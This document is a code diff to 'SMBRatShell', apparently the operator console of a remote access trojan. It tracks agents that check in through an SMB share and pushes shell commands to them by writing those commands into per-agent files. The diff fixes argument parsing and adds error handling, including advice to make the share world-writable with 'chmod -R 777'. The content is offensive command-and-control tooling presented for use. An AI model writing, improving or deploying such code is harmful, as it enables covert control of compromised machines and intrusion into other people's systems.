@@ -62,10 +62,10 @@ class SessionHandler(FileSystemEventHandler) :
 				agent_hostname, agent_mac = agent[:-18], agent[-17:]
 				# print (project, agent_hostname, agent_mac)
 				print ('''
-[+] Agent "{}" ({}) just checked in for Project: "{}"
+[+] Agent "{}" ({}) just checked-in for Project: "{}"
 '''.format(agent_hostname, agent_mac, project))
 				Sessions[project] = {}
-				Sessions[project][agent_hostname] = {}
+				Sessions[project][agent] = {}
 		# print (Sessions)
 
 
@@ -94,7 +94,7 @@ class SMBRatShell(cmd.Cmd) :
 		self.session_dict = session_dict
 		self.selected = set()
 
-	def do_EOF(self, *args): return ''
+	# def do_EOF(self, *args): return ''
 	def emptyline(self, *args): return ''
 
 	def do_session(self, line):
@@ -145,23 +145,33 @@ Example:
 		"""
 		for project, agent in self.selected:
 			exec_path = get_exec_path(project, agent)
-			with open(exec_path, 'w') as exfile:
-				exfile.write(line)
+			try :
+				with open(exec_path, 'w+') as exfile:
+					exfile.write(line)
+					print ('''
+[>] Sending '{command}' to "{project}/{hostname}" ...'''.format(command = line, project = project, hostname = agent))
+
+			except PermissionError as perror:
 				print ('''
-[>] Sending '{command}' to "{project}/{hostname}" ...
-					'''.format(command = line, project = project, hostname = agent))
+[!!!] Could not write to '{path}'.
+
+Usually happens because the SMB Server (who creates the files) runs as "root" (to bind the port 445 TCP).
+Type the command below to a new root shell and retry:
+	chmod -R 777 "{share}"'''.format(path = exec_path, share = Share) )
+				return
 
 
 if __name__ == '__main__' :
 
 	parser = argparse.ArgumentParser()
 
-	parser.addArgument('SHARE_PATH', description = 'Path to the directory that is used with the SMB Share')
-	parser.addArgument('--smb-auto-start', '-s', description = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
-						type = bool, default = False, action = 'store_true')
+	parser.add_argument('SHARE_PATH', help = 'Path to the directory that is used with the SMB Share')
+	parser.add_argument('--smb-auto-start', '-s', help = '''Uses impacket's "smbserver.py" to start an SMB Server with specified "ShareName"''',\
+						default = False, action = 'store_true')
 
+	args = parser.parse_args()
 
-	share_folder = 'Share/'
+	share_folder = args.SHARE_PATH
 	initialize(share_folder)
 
 	shell = SMBRatShell(Sessions)
